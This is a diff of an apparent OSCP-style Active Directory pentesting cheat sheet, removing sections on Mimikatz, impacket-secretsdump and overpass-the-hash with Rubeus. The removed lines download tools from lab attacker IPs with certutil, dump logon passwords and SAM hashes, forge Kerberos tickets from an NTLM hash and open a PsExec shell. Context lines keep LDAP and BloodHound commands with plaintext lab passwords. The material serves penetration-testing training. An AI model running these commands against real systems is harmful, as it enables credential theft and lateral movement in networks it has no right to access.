@@ -711,27 +711,8 @@ ldeep ldap -u tracy.white -p 'zqwj041FGX' -d ldap://nara-security.com -s 192.168
 
 ## Mimikatz
 
-```jsx
-certutil -urlcache -split -f http://192.168.45.241/mimikatz.exe
-.\mimikatz.exe
-privilege::debug
-sekurlsa::logonpasswords
 
-token::elevate
-lsadump::sam
-```
 
-```jsx
-.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "sekurlsa::msv" "lsadump::sam" "exit"
-```
-
-### impacket-secretsdump
-
-Surely we can extract with secretsdump from ntds, system or sam that we grab. But more we can extract passwords remotely!
-
-```jsx
-impacket-secretsdump oscp/emmet@10.10.1.202
-```
 
 ## Bloodhound
 
@@ -760,18 +741,7 @@ netexec ldap dc01.oscp.exam -u web_svc -p 'Diamond1' --bloodhound -c all -ns 10.
 
 [ConPtyShell/Invoke-ConPtyShell.ps1 at master · antonioCoco/ConPtyShell](https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1)
 
-## Overpass-the-hash
 
-```jsx
-certutil -split -urlcache -f http://192.168.45.228/Rubeus.exe
-.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
-.\Rubeus.exe asktgt /domain:access.offsec /user:svc_mssql /password:trustno1 /ptt
-# view tickets
-klist
-# get cmd shell
-certutil -split -urlcache -f http://192.168.45.214/PsExec.exe
-.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
-```
 
 ## Powershell Remoting
 
